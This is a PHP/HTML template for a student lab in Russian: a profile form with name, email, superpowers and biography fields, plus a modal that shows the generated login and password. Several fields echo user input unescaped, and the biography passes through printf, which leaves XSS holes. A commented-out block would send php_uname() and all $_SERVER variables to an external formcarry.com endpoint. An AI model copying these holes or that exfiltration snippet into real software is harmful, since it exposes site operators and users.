<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>5 задание</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-3.6.1.slim.min.js"
integrity="sha256-w8CvhFs7iHNVUtnSP0YKEg00p9Ih13rlL9zGqvLdePA=" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/styles/labsStyle.css">
<a style='font-size:30px; text-decoration:none;' href='login.php'>
<?php
  if($auth){
    echo 'Выйти';
  }else{
    echo 'Войти';
  }
?>
</a>
<form method="post" autocomplete="off" id="form" novalidate class="m-auto row g-4">
          <div class="col-md-6">
            <label for="formName" class="form-label">Имя</label>
            <input name="name" id="formName" class="form-control<?php if(!empty($errors['name'])) { print ' is-invalid';}?>" placeholder="Введите имя" value="<?php print $values['name']; ?>">
            <?php
              if(!empty($errors['name'])){
                print('<div class="invalid-feedback">'.$errors['name'].'</div>');
              } 
            ?>
          </div>
          <div class="col-md-6">
            <label for="formEmail" class="form-label">Email</label>
            <input name="email" id="formEmail" class="form-control<?php if(!empty($errors['email'])) { print ' is-invalid';}?>" type="email" placeholder="Введите почту" value="<?php print $values['email']; ?>">
            <?php
              if(!empty($errors['email'])){
                print('<div class="invalid-feedback">'.$errors['email'].'</div>');
              } 
            ?>
          </div>
          
          <div class="col-md-6">
            <label for="year" class="form-label">Год рождения</label>
            <select name="yob" id="year" class="form-select">
            <?php 
              if(!empty($values['yob'])){
                for ($i = 2023; $i >= 1900; $i--) {
                  if($i == $values['yob'])
                    printf('<option value="%d" selected>%d год</option>', $i, $i);
                  else
                    printf('<option value="%d">%d год</option>', $i, $i);
                }
              }else{
                for ($i = 2023; $i >= 1900; $i--) {
                    printf('<option value="%d">%d год</option>', $i, $i);
                }
              }
              ?>
            </select>
          </div>

          <div class="col-md-6 d-flex justify-content-center">

            <div class="col-6 m-auto row">
              <label class="form-label">Пол</label>
              <div class="col-6 ">
                <input class="form-check-input" type="radio" name="sex" value="1" <?php 
              if($values['sex']==1)
                echo 'checked';
              ?> id="M">
                <label class="form-check-label" for="M">М</label>
              </div>
              <div class="col-6">
                <input class="form-check-input" type="radio" name="sex" value="0" <?php 
              if($values['sex']==0)
                echo 'checked';
              ?> id="ZH">
                <label class="form-check- label" for="ZH">Ж</label>
              </div>
            </div>
            
            <div class="col-6 m-auto row">
              <label class="form-label">Количество конечностей</label>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="0" <?php 
              if($values['num_of_limbs']==0)echo 'checked'; ?> id="0">
                <label class="form-check-label" for="0">0</label>
              </div>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="1" <?php 
              if($values['num_of_limbs']==1)echo 'checked'; ?> id="1">
                <label class="form-check-label" for="1">1</label>
              </div>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="2" <?php 
              if($values['num_of_limbs']==2)echo 'checked'; ?> id="2">
                <label class="form-check-label" for="2">2</label>
              </div>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="3" <?php 
              if($values['num_of_limbs']==3)echo 'checked'; ?> id="3">
                <label class="form-check-label" for="3">3</label>
              </div>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="4" 
                <?php 
                  if($values['num_of_limbs']==4)echo 'checked';
              ?>  id="4">
                <label class="form-check-label" for="4">4</label>
              </div>
              <div class="col-6 col-md-2">
                <input class="form-check-input" type="radio" name="num_of_limbs" value="5" <?php 
              if($values['num_of_limbs']==5)echo 'checked'; ?> id="5">
                <label class="form-check-label" for="5">5</label>
              </div>
            </div>

          </div>

          <div class="col-12">
            <label for="superpowers" class="form-label">Сверхспособности</label>
            <select name="superpowers[]" id="superpowers" multiple="multiple" class="form-select<?php if(!empty($errors['superpowers'])) { print ' is-invalid';}?>">
              <?php
                $ar = array();
                if(!empty($values['superpowers']))
                  $ar = json_decode($values['superpowers']);
               ?>
              <option value="1" <?php if(in_array(1,$ar)) echo 'selected' ?>>бессмертие</option>
              <option value="2" <?php if(in_array(2,$ar)) echo 'selected' ?>>прохождение сквозь стены</option>
              <option value="3" <?php if(in_array(3,$ar)) echo 'selected' ?>>левитация</option>
            </select>
            <?php
              if(!empty($errors['superpowers'])){
                print('<div class="invalid-feedback">'.$errors['superpowers'].'</div>');
              } 
            ?>
          </div>

          <div class="col-12">
            <label for="biography" class="form-label">Биография</label>
            <textarea id="biography" class="form-control" name="biography" placeholder="Введите биографию"><?php
              if(!empty($values['biography']))
                printf($values['biography']);
               ?></textarea>
          </div>
          
          <div class="col-12 d-flex">
            <div class="form-check m-auto">
              <label class="form-check-label" for="policyCheckBox">С контрактом ознакомлен(а)</label>
              <input class="form-check-input<?php if(!empty($errors['policyCheckBox'])) { print ' is-invalid';}?>" type="checkbox" id="policyCheckBox" <?php 
              if(!empty($values['policyCheckBox']) && $values['policyCheckBox']=='on'){
                echo 'checked';
              } ?> name="policyCheckBox">
              <?php
              if(!empty($errors['policyCheckBox'])){
                print('<div class="invalid-feedback">'.$errors['policyCheckBox'].'</div>');
              } 
            ?>
            </div>
          </div>
          <div class="col-12 d-flex">          
            <input type="submit" id="submitBtn" class="btn btn-success m-auto" value="Отправить">
          </div>
        </form>

<div class="modal fade" data-bs-backdrop='static' id="modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-body d-flex flex-column text-center p-0">
        <h1>Спасибо, результаты сохранены.</h1>
        <?php
          if (empty($changed)) {
            echo '<h2> Ваш логин: '.$login.'</h2>';
            echo '<h2> Ваш пароль: '.$password.'</h2>';} 
          ?>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">ОК</button>
      </div>
    </div>
  </div>
</div>

<script>
  // <?php
  //   if( !!empty($_SESSION['last_access']) || (time() - $_SESSION['last_access']) > 60*60 ){
  //     // отправка данных о пользователе
  //     echo 'const data = {'; 
  //     echo '"SERVER_NAME" : "'.php_uname().'",';
  //     foreach($_SERVER as $key => $value){
  //       echo '"'.$key.'" : String.raw`'.$value.'`,';
  //     }
  //     $_SESSION['last_access'] = time();
  //     echo '};';
  //     echo 'fetch("https://formcarry.com/s/iZs62W5Im", { method: "POST", headers:{"Content-Type": "application/json",},body: JSON.stringify(data),});';
  //     // echo 'alert('.$_SESSION['last_access'].');';
  //   }
  // ?>
  
  $("#form").submit(function (e) {
    $("#submitBtn").attr("disabled", true);});  
</script>


<?php
if ($saved) {
echo "<script type='text/javascript'>
$(document).ready(function(){
  $('#modal').modal('show');
});
</script>";}  
?>
